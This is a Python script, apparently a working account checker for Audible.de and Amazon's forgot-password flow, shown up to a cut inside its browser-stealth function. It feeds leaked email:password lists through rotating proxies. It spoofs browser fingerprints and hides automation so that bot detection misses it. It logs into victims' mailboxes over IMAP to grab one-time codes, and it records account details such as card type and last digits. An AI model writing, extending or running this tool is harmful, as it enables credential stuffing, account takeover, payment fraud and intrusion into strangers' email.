#!/usr/bin/env python3
"""
Audible.de Forgot Password Checker v2.0
Ported fingerprint system from fingerprint-generator package (hardware-tier-correlated).

Fitur:
  - Speed profiles: slow | normal | fast | maximum
  - Proxy pool (sticky, rotate on block)
  - Upgraded fingerprint: hardware-tier-correlated GPU/RAM/CPU, Sec-CH-UA GREASE,
    platform-weighted screen res, per-platform fonts, audio clusters, WebGL exts,
    math/tan/sin/cos variation, Chrome plugins
  - IMAP OTP auto-fetch (t-online.de)
  - Rich animated dashboard
  - Auto-save results.txt + results_filtered.txt + results.json
  - Status: v2l | CC:TYPE:XXXX | DCQ:phone/name/zip | OTP_SMS | PUSH_NOTIF | CUSTOMER_SERVICE

Output: email:pass (STATUS) — satu per baris

Usage:
  python3 audible_fp.py                          # interactive speed menu
  python3 audible_fp.py --batch accounts.txt
  python3 audible_fp.py --batch accounts.txt --speed fast
  python3 audible_fp.py --batch accounts.txt --speed maximum --proxy-file proxies.txt
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import imaplib
import email
import json
import math
import os
import random
import re
import sys
import threading
import time
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from pathlib import Path
from typing import Any, Optional

# ── Rich UI ──────────────────────────────────────────────────────────────────
try:
    from rich.console import Console
    from rich.live import Live
    from rich.table import Table
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.text import Text
    from rich import box
    RICH = True
    console = Console()
except ImportError:
    RICH = False
    console = None
    print("[!] pip install rich  — dashboard disabled, plain output")

# ── Playwright ────────────────────────────────────────────────────────────────
try:
    from playwright.sync_api import sync_playwright
    HAS_PLAYWRIGHT = True
except ImportError:
    HAS_PLAYWRIGHT = False

FORGOT_BASE_URL = (
    "https://www.amazon.de/ap/forgotpassword?"
    "openid.pape.max_auth_age=900"
    "&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
    "&siteState=audibleid.userType%3Damzn%2Caudibleid.mode%3Did_res"
    "&marketPlaceId=AN7V1F1VY261K"
    "&language=de_DE"
    "&pageId=amzn_audible_de"
    "&openid.return_to=https%3A%2F%2Fwww.audible.de%2F"
    "&openid.assoc_handle=audible_experiment_shared_web_de"
    "&openid.mode=checkid_setup"
    "&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
    "&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
)

IMAP_HOST = "secureimap.t-online.de"  # legacy default (t-online)
IMAP_PORT = 993

# Per-provider IMAP config: domain → (host, port)
IMAP_PROVIDERS: dict[str, tuple[str, int]] = {
    # T-Online
    "t-online.de":     ("secureimap.t-online.de",   993),
    # EWE / EWETEL (both domains → shared imap.ewe.net, verified working)
    "ewe.net":         ("imap.ewe.net",             993),
    "ewetel.net":      ("imap.ewe.net",             993),
    # IONOS / 1&1 hosted domains (verified: login OK on imap.ionos.de)
    "online.de":       ("imap.ionos.de",            993),
    "onlinehome.de":   ("imap.ionos.de",            993),
    # Microsoft (all personal accounts route through outlook.office365.com)
    "outlook.com":     ("outlook.office365.com",     993),
    "outlook.de":      ("outlook.office365.com",     993),
    "hotmail.com":     ("outlook.office365.com",     993),
    "hotmail.de":      ("outlook.office365.com",     993),
    "hotmail.co.uk":   ("outlook.office365.com",     993),
    "hotmail.fr":      ("outlook.office365.com",     993),
    "hotmail.it":      ("outlook.office365.com",     993),
    "hotmail.es":      ("outlook.office365.com",     993),
    "hotmail.nl":      ("outlook.office365.com",     993),
    "live.com":        ("outlook.office365.com",     993),
    "live.de":         ("outlook.office365.com",     993),
    "live.nl":         ("outlook.office365.com",     993),
    "live.fr":         ("outlook.office365.com",     993),
    "live.co.uk":      ("outlook.office365.com",     993),
    "msn.com":         ("outlook.office365.com",     993),
}

_MSFT_DOMAINS = frozenset(
    d for d, (host, _p) in IMAP_PROVIDERS.items()
    if host == "outlook.office365.com"
)


def _get_imap_config(email: str) -> tuple[str, int]:
    """Return (imap_host, imap_port) for the given email address."""
    domain = email.split("@")[-1].lower().strip() if "@" in email else ""
    return IMAP_PROVIDERS.get(domain, (IMAP_HOST, IMAP_PORT))

BANNER = r"""
 / _ \ _ _  __| (_) |__ | |___   | __| _ \ 
| (_) | || |/ _` | | '_ \| / -_) | _||  _/ 
 \__\_\\_,_|\__,_|_|_.__/|_\___| |_| |_|   
      Audible.de Forgot Password Checker v2.0
      Upgraded fingerprinting (hardware-tier-correlated)
"""

VERSION = "2.0.0"

# ─────────────────────────────────────────────────────────────────────────────
# Speed profiles
# ─────────────────────────────────────────────────────────────────────────────
SPEED_PROFILES: dict[str, dict[str, Any]] = {
    "slow": {
        "label": "Slow", "workers": 1, "stagger": 2.0, "otp_timeout": 90,
        "human_lo": 2.0, "human_hi": 4.0,
        "type_delay_lo": 80, "type_delay_hi": 180,
        "est": "~1–2 acc/min", "blurb": "gentle · debug · lowest detection risk",
    },
    "normal": {
        "label": "Normal", "workers": 3, "stagger": 0.5, "otp_timeout": 75,
        "human_lo": 1.2, "human_hi": 2.5,
        "type_delay_lo": 60, "type_delay_hi": 130,
        "est": "~4–6 acc/min", "blurb": "stable default · recommended",
    },
    "fast": {
        "label": "Fast", "workers": 5, "stagger": 0.2, "otp_timeout": 60,
        "human_lo": 0.8, "human_hi": 1.8,
        "type_delay_lo": 40, "type_delay_hi": 100,
        "est": "~8–12 acc/min", "blurb": "snappy · may hit rate limits",
    },
    "maximum": {
        "label": "Maximum", "workers": 8, "stagger": 0.05, "otp_timeout": 50,
        "human_lo": 0.5, "human_hi": 1.2,
        "type_delay_lo": 30, "type_delay_hi": 80,
        "est": "~15–20 acc/min", "blurb": "max workers · use proxies · captcha risk",
    },
}

def normalize_speed(raw: str | None) -> str:
    s = (raw or "normal").strip().lower()
    aliases = {
        "1": "slow", "s": "slow", "lambat": "slow",
        "2": "normal", "n": "normal",
        "3": "fast", "f": "fast", "cepat": "fast",
        "4": "maximum", "m": "maximum", "max": "maximum", "maks": "maximum",
    }
    r = aliases.get(s, s)
    return r if r in SPEED_PROFILES else "normal"


# ─────────────────────────────────────────────────────────────────────────────
# Proxy pool
# ─────────────────────────────────────────────────────────────────────────────
class ProxyPool:
    """Round-robin pool. Distinct IP per worker; no rotations on transient
    errors — the ISP proxies are static, so rotating only burns credits and
    still hits the same IP anyway."""

    def __init__(self, proxies: list[str]):
        self._proxies = proxies
        self._idx = 0
        self._lock = threading.Lock()
        self._rotations = 0

    def acquire(self) -> dict | None:
        if not self._proxies: return None
        with self._lock:
            raw = self._proxies[self._idx % len(self._proxies)]
            # round-robin: parallel workers each get a distinct IP
            if len(self._proxies) > 1:
                self._idx = (self._idx + 1) % len(self._proxies)
        return _parse_proxy(raw)

    def force_rotate(self, reason: str = "") -> dict | None:
        if not self._proxies: return None
        with self._lock:
            self._idx = (self._idx + 1) % len(self._proxies)
            self._rotations += 1
            raw = self._proxies[self._idx]
        return _parse_proxy(raw)

    @property
    def size(self): return len(self._proxies)
    @property
    def rotations(self): return self._rotations

    def peek(self) -> dict | None:
        """Parse the current proxy without advancing the index."""
        if not self._proxies:
            return None
        return _parse_proxy(self._proxies[self._idx % len(self._proxies)])


def _safe_url(page) -> str:
    try:
        return page.url or ""
    except Exception:
        return ""


def _parse_proxy(s: str) -> dict | None:
    s = s.strip().split()[0]  # take first token only (handle "url https://i.pn" format)
    if not s or s.startswith("#"): return None
    try:
        if "://" in s:
            m = re.match(r'(https?|socks[45])://([^:@]+):([^@]+)@([^:]+):(\d+)', s)
            if m:
                return {"server": f"{m.group(1)}://{m.group(4)}:{m.group(5)}",
                        "username": m.group(2), "password": m.group(3)}
            m = re.match(r'(https?|socks[45])://([^:]+):(\d+)', s)
            if m: return {"server": f"{m.group(1)}://{m.group(2)}:{m.group(3)}"}
        else:
            parts = s.split(":")
            if len(parts) == 4:
                return {"server": f"http://{parts[0]}:{parts[1]}",
                        "username": parts[2], "password": parts[3]}
            if len(parts) == 2:
                return {"server": f"http://{parts[0]}:{parts[1]}"}
    except Exception:
        pass
    return None


def load_proxies(proxy_file: str) -> ProxyPool:
    proxies = []
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    proxies.append(line)
    pool = ProxyPool(proxies)
    print(f"[PROXY] Loaded {pool.size} proxies", flush=True)
    return pool


# ─────────────────────────────────────────────────────────────────────────────
# Fingerprint Generator — ported from fingerprint-generator Go package
# ─────────────────────────────────────────────────────────────────────────────

# Hardware tiers
TIER_LOW, TIER_MID, TIER_HIGH = 0, 1, 2

# Chrome versions (120–151 matching Go package)
CHROME_VERSIONS = [
    "120", "121", "122", "123", "124", "125", "126", "127", "128", "129",
    "130", "131", "132", "133", "134", "135", "136", "137", "138", "139",
    "140", "141", "142", "143", "144", "145", "146", "147", "148", "149",
    "150", "151",
]

GREASE_BRANDS = [
    "Not_A Brand", "Not(A:Brand", "Not-A.Brand", "Not)A;Brand",
    "Not/A)Brand", "Not A;Brand", "Not?A_Brand",
]

# Platform weights (Windows 70%, macOS 20%, Linux 10%)
PLAT_WINDOWS = "Win32"
PLAT_MACOS   = "MacIntel"
PLAT_LINUX   = "Linux x86_64"

# GPU tiers for Windows / Linux
GPU_TIERS_WIN_LINUX = [
    # Low-end (integrated)
    [
        ("Intel", "Intel(R) UHD Graphics 630",          "ANGLE (Intel, Intel(R) UHD Graphics 630 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("Intel", "Intel(R) UHD Graphics 730",          "ANGLE (Intel, Intel(R) UHD Graphics 730 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("Intel", "Intel(R) HD Graphics 620",           "ANGLE (Intel, Intel(R) HD Graphics 620 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("Intel", "Intel(R) Iris(R) Xe Graphics",       "ANGLE (Intel, Intel(R) Iris(R) Xe Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("Intel", "Intel(R) Iris(R) Plus Graphics",     "ANGLE (Intel, Intel(R) Iris(R) Plus Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("AMD",   "AMD Radeon(TM) Graphics",             "ANGLE (AMD, AMD Radeon(TM) Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("AMD",   "AMD Radeon Vega 8 Graphics",          "ANGLE (AMD, AMD Radeon Vega 8 Graphics Direct3D11 vs_5_0 ps_5_0, D3D11)"),
    ],
    # Mid-range
    [
        ("NVIDIA", "NVIDIA GeForce GTX 1650",           "ANGLE (NVIDIA, NVIDIA GeForce GTX 1650 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("NVIDIA", "NVIDIA GeForce GTX 1660 Super",     "ANGLE (NVIDIA, NVIDIA GeForce GTX 1660 Super Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("NVIDIA", "NVIDIA GeForce RTX 2060",           "ANGLE (NVIDIA, NVIDIA GeForce RTX 2060 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("NVIDIA", "NVIDIA GeForce RTX 3060",           "ANGLE (NVIDIA, NVIDIA GeForce RTX 3060 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("NVIDIA", "NVIDIA GeForce RTX 3050 Laptop GPU","ANGLE (NVIDIA, NVIDIA GeForce RTX 3050 Laptop GPU Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("AMD",    "AMD Radeon RX 5600 XT",             "ANGLE (AMD, AMD Radeon RX 5600 XT Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("AMD",    "AMD Radeon RX 6600 XT",             "ANGLE (AMD, AMD Radeon RX 6600 XT Direct3D11 vs_5_0 ps_5_0, D3D11)"),
    ],
    # High-end
    [
        ("NVIDIA", "NVIDIA GeForce RTX 3070",           "ANGLE (NVIDIA, NVIDIA GeForce RTX 3070 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("NVIDIA", "NVIDIA GeForce RTX 3080",           "ANGLE (NVIDIA, NVIDIA GeForce RTX 3080 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("NVIDIA", "NVIDIA GeForce RTX 4070",           "ANGLE (NVIDIA, NVIDIA GeForce RTX 4070 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("NVIDIA", "NVIDIA GeForce RTX 4080",           "ANGLE (NVIDIA, NVIDIA GeForce RTX 4080 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("NVIDIA", "NVIDIA GeForce RTX 4090",           "ANGLE (NVIDIA, NVIDIA GeForce RTX 4090 Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("AMD",    "AMD Radeon RX 6800 XT",             "ANGLE (AMD, AMD Radeon RX 6800 XT Direct3D11 vs_5_0 ps_5_0, D3D11)"),
        ("AMD",    "AMD Radeon RX 7900 XTX",            "ANGLE (AMD, AMD Radeon RX 7900 XTX Direct3D11 vs_5_0 ps_5_0, D3D11)"),
    ],
]

# Apple Silicon chips per tier (macOS)
APPLE_SILICON = [
    ["Apple M1"],
    ["Apple M2", "Apple M1 Pro"],
    ["Apple M3 Pro", "Apple M3 Max", "Apple M4 Pro", "Apple M4 Max", "Apple M2 Max"],
]

# Intel Mac GPUs (fallback ~30% of macOS)
INTEL_MAC_GPUS = [
    "Intel(R) Iris(TM) Plus Graphics OpenGL Engine",
    "Intel(R) UHD Graphics 630",
    "Intel(R) Iris(TM) Graphics 6100",
    "Intel(R) HD Graphics 630",
]

# Mesa strings for Linux (~50%)
MESA_GPUS = [
    "Mesa Intel(R) UHD Graphics (TGL GT1)",
    "Mesa Intel(R) UHD Graphics 630 (CFL GT2)",
    "Mesa Intel(R) Iris(R) Xe Graphics (TGL GT2)",
    "AMD Radeon Graphics (radeonsi, renoir, LLVM 15.0.7, DRM 3.49, 6.2.0-generic)",
    "AMD Radeon RX 6600 (radeonsi, navi23, LLVM 15.0.7, DRM 3.49, 6.2.0-generic)",
    "NVIDIA GeForce RTX 3060/PCIe/SSE2",
    "llvmpipe (LLVM 15.0.7, 256 bits)",
]

# Hardware (RAM GB, CPU cores) per tier
HW_SPECS = [
    # Low
    {"ram": [4, 8],         "cores": [4, 6, 8]},
    # Mid
    {"ram": [8, 16],        "cores": [8, 10, 12]},
    # High
    {"ram": [16, 32, 64],   "cores": [12, 16, 20, 24, 32]},
]

# Apple Silicon hardware per tier
APPLE_HW = [
    {"ram": [8, 16],             "cores": [8]},
    {"ram": [8, 16, 24],         "cores": [8, 10]},
    {"ram": [16, 24, 32, 64, 96, 128], "cores": [10, 12, 14, 16]},
]

# Screen resolutions
SCREENS_WIN = {
    "16x9":  [(1366, 768), (1536, 864), (1600, 900), (1920, 1080), (2560, 1440), (3840, 2160)],
    "16x10": [(1440, 900), (1680, 1050), (1920, 1200), (2560, 1600)],
    "21x9":  [(2560, 1080), (3440, 1440)],
    "other": [(1280, 720), (1360, 768), (2880, 1800)],
}
SCREENS_MAC = [
    (2560, 1600, 2), (2880, 1800, 2), (3024, 1964, 2), (3456, 2234, 2),
    (1440, 900, 1),  (1680, 1050, 1), (1512, 982, 2),
]

# Font pools
FONTS_WINDOWS = [
    "Arial", "Arial Black", "Bahnschrift", "Calibri", "Cambria", "Cambria Math",
    "Candara", "Comic Sans MS", "Consolas", "Constantia", "Corbel", "Courier New",
    "Ebrima", "Franklin Gothic Medium", "Gabriola", "Gadugi", "Georgia", "Impact",
    "Ink Free", "Javanese Text", "Leelawadee UI", "Lucida Console", "Lucida Sans Unicode",
    "Malgun Gothic", "Marlett", "Microsoft Himalaya", "Microsoft JhengHei",
    "Microsoft New Tai Lue", "Microsoft PhagsPa", "Microsoft Sans Serif",
    "Microsoft Tai Le", "Microsoft YaHei", "MingLiU-ExtB", "Mongolian Baiti",
    "MS Gothic", "MV Boli", "Myanmar Text", "Nirmala UI", "Palatino Linotype",
    "Segoe MDL2 Assets", "Segoe Print", "Segoe Script", "Segoe UI", "Segoe UI Emoji",
    "Segoe UI Historic", "Segoe UI Symbol", "SimSun", "Sitka", "Sylfaen", "Symbol",
    "Tahoma", "Times New Roman", "Trebuchet MS", "Verdana", "Webdings", "Wingdings",
    "Yu Gothic",
]
FONTS_MACOS = [
    "American Typewriter", "Andale Mono", "Arial", "Arial Black", "Arial Narrow",
    "Arial Rounded MT Bold", "Arial Unicode MS", "Avenir", "Avenir Next",
    "Avenir Next Condensed", "Baskerville", "Big Caslon", "Bodoni 72", "Bradley Hand",
    "Brush Script MT", "Chalkboard", "Chalkboard SE", "Chalkduster", "Charter",
    "Cochin", "Comic Sans MS", "Copperplate", "Courier", "Courier New", "Didot",
    "DIN Alternate", "DIN Condensed", "Futura", "Geneva", "Georgia", "Gill Sans",
    "Helvetica", "Helvetica Neue", "Herculanum", "Hoefler Text", "Impact",
    "Lucida Grande", "Luminari", "Marker Felt", "Menlo", "Monaco", "Noteworthy",
    "Optima", "Palatino", "Papyrus", "Phosphate", "Rockwell", "Savoye LET",
    "SignPainter", "Skia", "Snell Roundhand", "Tahoma", "Times", "Times New Roman",
    "Trattatello", "Trebuchet MS", "Verdana", "Zapfino",
]
FONTS_LINUX = [
    "Bitstream Charter", "Cantarell", "Century Schoolbook L", "Courier 10 Pitch",
    "DejaVu Sans", "DejaVu Sans Mono", "DejaVu Serif", "Dingbats", "FreeMono",
    "FreeSans", "FreeSerif", "Liberation Mono", "Liberation Sans", "Liberation Serif",
    "Nimbus Mono L", "Nimbus Roman No9 L", "Nimbus Sans L", "Noto Color Emoji",
    "Noto Mono", "Noto Sans", "Noto Sans Mono", "Noto Serif", "Standard Symbols L",
    "Ubuntu", "Ubuntu Condensed", "Ubuntu Mono", "URW Bookman L", "URW Chancery L",
    "URW Gothic L", "URW Palladio L",
]

# WebGL core extensions (always present)
WEBGL_EXTS_CORE = [
    "ANGLE_instanced_arrays", "EXT_blend_minmax", "EXT_color_buffer_half_float",
    "EXT_float_blend", "EXT_frag_depth", "EXT_shader_texture_lod",
    "EXT_texture_filter_anisotropic", "EXT_sRGB", "KHR_parallel_shader_compile",
    "OES_element_index_uint", "OES_fbo_render_mipmap", "OES_standard_derivatives",
    "OES_texture_float", "OES_texture_float_linear", "OES_texture_half_float",
    "OES_texture_half_float_linear", "OES_vertex_array_object",
    "WEBGL_color_buffer_float", "WEBGL_compressed_texture_s3tc",
    "WEBGL_compressed_texture_s3tc_srgb", "WEBGL_debug_renderer_info",
    "WEBGL_debug_shaders", "WEBGL_depth_texture", "WEBGL_draw_buffers",
    "WEBGL_lose_context", "WEBGL_multi_draw",
]
WEBGL_EXTS_OPT = [
    "EXT_disjoint_timer_query", "EXT_texture_compression_bptc",
    "EXT_texture_compression_rgtc", "WEBGL_compressed_texture_astc",
    "WEBGL_compressed_texture_etc", "OES_draw_buffers_indexed",
    "EXT_color_buffer_float",
]

# Chrome built-in PDF plugins
CHROME_PLUGINS = [
    {"name": "PDF Viewer",              "filename": "internal-pdf-viewer", "description": "Portable Document Format"},
    {"name": "Chrome PDF Viewer",       "filename": "internal-pdf-viewer", "description": "Portable Document Format"},
    {"name": "Chromium PDF Viewer",     "filename": "internal-pdf-viewer", "description": "Portable Document Format"},
    {"name": "Microsoft Edge PDF Viewer","filename": "internal-pdf-viewer","description": "Portable Document Format"},
    {"name": "WebKit built-in PDF",     "filename": "internal-pdf-viewer", "description": "Portable Document Format"},
]

# Audio fingerprint base clusters per platform
AUDIO_BASES = {
    PLAT_MACOS:  "124.0434485875848",
    PLAT_LINUX:  "124.08072766105033",
    PLAT_WINDOWS:"124.04347527516074",
}

# Region profiles — especially DE for Audible.de
REGION_PROFILES = [
    # country, tz_label, tz_offset, languages, locale, weight
    ("de", "Europe/Berlin",    1, ["de-DE", "de", "en"],       "de-DE", 30),
    ("de", "Europe/Berlin",    1, ["de-DE", "de", "en-US"],    "de-DE", 20),
    ("at", "Europe/Vienna",    1, ["de-AT", "de", "en"],       "de-AT",  5),
    ("ch", "Europe/Zurich",    1, ["de-CH", "de", "en"],       "de-CH",  5),
    ("gb", "Europe/London",    0, ["en-GB", "en"],             "en-GB",  5),
    ("fr", "Europe/Paris",     1, ["fr-FR", "fr", "en"],       "fr-FR",  5),
    ("nl", "Europe/Amsterdam", 1, ["nl-NL", "nl", "en"],       "nl-NL",  3),
    ("us", "America/New_York",-5, ["en-US", "en"],             "en-US",  5),
    ("pl", "Europe/Warsaw",    1, ["pl-PL", "pl", "en"],       "pl-PL",  3),
    ("it", "Europe/Rome",      1, ["it-IT", "it", "en"],       "it-IT",  3),
]


def _gen_hardware_tier() -> int:
    r = random.randint(0, 99)
    if r < 30: return TIER_LOW
    if r < 75: return TIER_MID
    return TIER_HIGH


def _gen_platform() -> str:
    r = random.randint(0, 99)
    if r < 70: return PLAT_WINDOWS
    if r < 90: return PLAT_MACOS
    return PLAT_LINUX


def _gen_gpu(platform: str, tier: int) -> tuple[str, str]:
    if platform == PLAT_MACOS:
        if random.randint(0, 9) < 7:
            chip = random.choice(APPLE_SILICON[tier])
            vendor = "Google Inc. (Apple)"
            model  = f"ANGLE (Apple, ANGLE Metal Renderer: {chip}, Unspecified Version)"
        else:
            m = random.choice(INTEL_MAC_GPUS)
            vendor = "Google Inc. (Intel Inc.)"
            model  = f"ANGLE (Intel Inc., {m}, OpenGL 4.1)"
        return vendor, model
    if platform == PLAT_LINUX:
        if random.randint(0, 1) == 0:
            m = random.choice(MESA_GPUS)
            return "Mesa", m
        chip_vendor, _, renderer = random.choice(GPU_TIERS_WIN_LINUX[tier])
        # Linux uses OpenGL 4.6
        renderer = renderer.replace("Direct3D11 vs_5_0 ps_5_0, D3D11", "OpenGL 4.6")
        return f"Google Inc. ({chip_vendor})", renderer
    # Windows
    chip_vendor, _, renderer = random.choice(GPU_TIERS_WIN_LINUX[tier])
    return f"Google Inc. ({chip_vendor})", renderer


def _gen_hardware(platform: str, tier: int, gpu_model: str) -> tuple[int, int]:
    if platform == PLAT_MACOS and "Apple M" in gpu_model:
        spec = APPLE_HW[tier]
    else:
        spec = HW_SPECS[tier]
    return random.choice(spec["ram"]), random.choice(spec["cores"])


def _gen_screen(platform: str) -> tuple[int, int, int, int, int, float]:
    """Returns (w, h, avail_w, avail_h, color_depth, dpr)"""
    if platform == PLAT_MACOS:
        w, h, dpr = random.choice(SCREENS_MAC)
        menu_bar = 24 + random.randint(0, 8)
        cd = 30  # macOS Retina reports 30-bit
        return w, h, w, h - menu_bar, cd, dpr
    pools = (
        SCREENS_WIN["16x9"] * 3 +
        SCREENS_WIN["16x10"] +
        SCREENS_WIN["21x9"] +
        SCREENS_WIN["other"]
    )
    w, h = random.choice(pools)
    taskbar = ((32 + random.randint(0, 16)) // 8) * 8
    if taskbar < 32: taskbar = 32
    cd = random.choice([24, 24, 24, 24, 30])
    return w, h, w, h - taskbar, cd, 1.0


def _gen_fonts(platform: str) -> list[str]:
    pool = {PLAT_MACOS: FONTS_MACOS, PLAT_LINUX: FONTS_LINUX}.get(platform, FONTS_WINDOWS)
    work = list(pool)
    random.shuffle(work)
    keep = max(1, int(len(work) * (80 + random.randint(0, 15)) / 100))
    return sorted(work[:keep])


def _gen_webgl_exts() -> list[str]:
    exts = list(WEBGL_EXTS_CORE)
    n_opt = random.randint(0, 4)
    if n_opt:
        opts = list(WEBGL_EXTS_OPT)
        random.shuffle(opts)
        exts += opts[:n_opt]
    return sorted(exts)


def _gen_math() -> tuple[str, str, str]:
    tan_end = random.randint(3, 102)
    sin_end = random.randint(3, 102)
    tan = f"-1.42144882387472{tan_end:03d}"
    sin = f"0.81788191211590{sin_end:03d}"
    if random.randint(0, 9) < 7:
        cos_end = 89 + random.randint(0, 14)
        cos = f"-0.5753861119575{cos_end:03d}"
    else:
        cos_end = 53 + random.randint(0, 9)
        cos = f"-0.5765775004286{cos_end:03d}"
    return tan, sin, cos


def _gen_audio(platform: str, tier: int) -> str:
    base = AUDIO_BASES.get(platform, AUDIO_BASES[PLAT_WINDOWS])
    tail = (tier * 7 + random.randint(0, 89)) % 100
    return f"{base[:-2]}{tail:02d}"


def _gen_chrome_version() -> tuple[str, str, str]:
    """Returns (full_version, sec_ua, major_str)"""
    major = random.choice(CHROME_VERSIONS)
    grease = random.choice(GREASE_BRANDS)
    grease_ver = str(8 + random.randint(0, 91))
    full_ver = f"{major}.0.0.0"
    sec_ua = f'"{grease}";v="{grease_ver}", "Chromium";v="{major}", "Google Chrome";v="{major}"'
    return full_ver, sec_ua, major


def _gen_ua(platform: str, chrome_ver: str) -> str:
    if platform == PLAT_MACOS:
        return f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"
    if platform == PLAT_LINUX:
        return f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_ver} Safari/537.36"


def _pick_region() -> tuple[str, str, list[str], str]:
    """Returns (tz_label, lang_primary, languages_list, locale)"""
    total = sum(r[5] for r in REGION_PROFILES)
    r = random.randint(0, total - 1)
    for row in REGION_PROFILES:
        if r < row[5]:
            return row[1], row[3][0], row[3], row[4]
        r -= row[5]
    return "Europe/Berlin", "de-DE", ["de-DE", "de", "en"], "de-DE"


def gen_fingerprint() -> dict:
    """Generate a complete, hardware-tier-correlated browser fingerprint."""
    tier     = _gen_hardware_tier()
    platform = _gen_platform()
    chrome_ver, sec_ua, major = _gen_chrome_version()
    gpu_vendor, gpu_renderer  = _gen_gpu(platform, tier)
    ram, cores                = _gen_hardware(platform, tier, gpu_renderer)
    sw, sh, aw, ah, cd, dpr   = _gen_screen(platform)
    fonts                     = _gen_fonts(platform)
    exts                      = _gen_webgl_exts()
    tan, sin_v, cos_v         = _gen_math()
    audio                     = _gen_audio(platform, tier)
    canvas_noise              = int(hashlib.sha256(os.urandom(16)).hexdigest()[:2], 16) & 7
    tz_label, lang, langs, locale = _pick_region()
    ua                        = _gen_ua(platform, chrome_ver)
    plugins                   = list(CHROME_PLUGINS)
    random.shuffle(plugins)

    sec_ch_platform = {"MacIntel": "macOS", "Linux x86_64": "Linux"}.get(platform, "Windows")

    return {
        "ua":            ua,
        "chrome_ver":    chrome_ver,
        "major":         major,
        "sec_ua":        sec_ua,
        "sec_ch_platform": sec_ch_platform,
        "platform":      platform,
        "gpu_vendor":    gpu_vendor,
        "gpu_renderer":  gpu_renderer,
        "screen_w":      sw,
        "screen_h":      sh,
        "avail_w":       aw,
        "avail_h":       ah,
        "color_depth":   cd,
        "dpr":           dpr,
        "device_memory": ram,
        "hw_concurrency": cores,
        "tz":            tz_label,
        "lang":          lang,
        "langs":         langs,
        "locale":        locale,
        "fonts":         fonts,
        "webgl_exts":    exts,
        "math_tan":      tan,
        "math_sin":      sin_v,
        "math_cos":      cos_v,
        "audio":         audio,
        "canvas_noise":  canvas_noise,
        "plugins":       plugins,
        "tier":          tier,
    }


def get_stealth_js(fp: dict) -> str:
    """Build comprehensive stealth injection script from fingerprint."""
    ua  = fp["ua"].replace("\\", "\\\\").replace('"', '\\"')
    wv  = fp["gpu_vendor"].replace('"', '\\"')
    wr  = fp["gpu_renderer"].replace('"', '\\"')
    cn  = fp["canvas_noise"]
    hw  = fp["hw_concurrency"]
    dm  = fp["device_memory"]
    maj = fp["major"]
    plat_nav = fp["platform"]
    sec_ua   = fp["sec_ua"].replace('"', '\\"')
    sec_plat = fp["sec_ch_platform"]
    lang     = fp["lang"].replace('"', '\\"')
    langs_js = json.dumps(fp["langs"])
    sw, sh   = fp["screen_w"], fp["screen_h"]
    aw, ah   = fp["avail_w"],  fp["avail_h"]
    cd       = fp["color_depth"]
    dpr      = fp["dpr"]
    tan_v    = fp["math_tan"]
    sin_v    = fp["math_sin"]
    cos_v    = fp["math_cos"]
    audio_v  = fp["audio"]

    plugins_js = "["
    for p in fp["plugins"]:
        plugins_js += (
            f'{{name:"{p["name"]}",filename:"{p["filename"]}",description:"{p["description"]}"}},'
        )
    plugins_js = plugins_js.rstrip(",") + "]"

    exts_js  = json.dumps(fp["webgl_exts"])

    return f"""(function(){{
  try{{
    /* navigator overrides */
    const nd=Object.defineProperty.bind(Object,navigator);
    nd('webdriver',{{get:()=>false,configurable:true}});
    nd('userAgent',{{get:()=>"{ua}",configurable:true}});
    nd('platform',{{get:()=>"{plat_nav}",configurable:true}});
    nd('hardwareConcurrency',{{get:()=>{hw},configurable:true}});
    nd('deviceMemory',{{get:()=>{dm},configurable:true}});
    nd('languages',{{get:()=>{langs_js},configurable:true}});
    nd('language',{{get:()=>"{lang}",configurable:true}});
    nd('userAgentData',{{get:()=>{{
      return{{
        brands:[{{brand:"Chromium",version:"{maj}"}},{{brand:"Google Chrome",version:"{maj}"}},{{brand:"Not-A.Brand",version:"99"}}],
        mobile:false,platform:"{sec_plat}",
        getHighEntropyValues:function(h){{return Promise.resolve({{platform:"{sec_plat}",platformVersion:"10.0.0",architecture:"x86",model:"",uaFullVersion:"{fp["chrome_ver"]}",fullVersionList:[{{brand:"Chromium",version:"{fp["chrome_ver"]}"}},{{brand:"Google Chrome",version:"{fp["chrome_ver"]}"}}]}});}},
        toJSON:function(){{return{{brands:this.brands,mobile:this.mobile,platform:this.platform}};}}
      }};
    }},configurable:true}});

    /* plugins */
    const fakePlugins={plugins_js};
    try{{Object.defineProperty(navigator,'plugins',{{get:()=>fakePlugins,configurable:true}});}}catch(e){{}}

    /* screen */
    const sd=Object.defineProperty.bind(Object,screen);
    sd('width',{{get:()=>{sw},configurable:true}});
    sd('height',{{get:()=>{sh},configurable:true}});
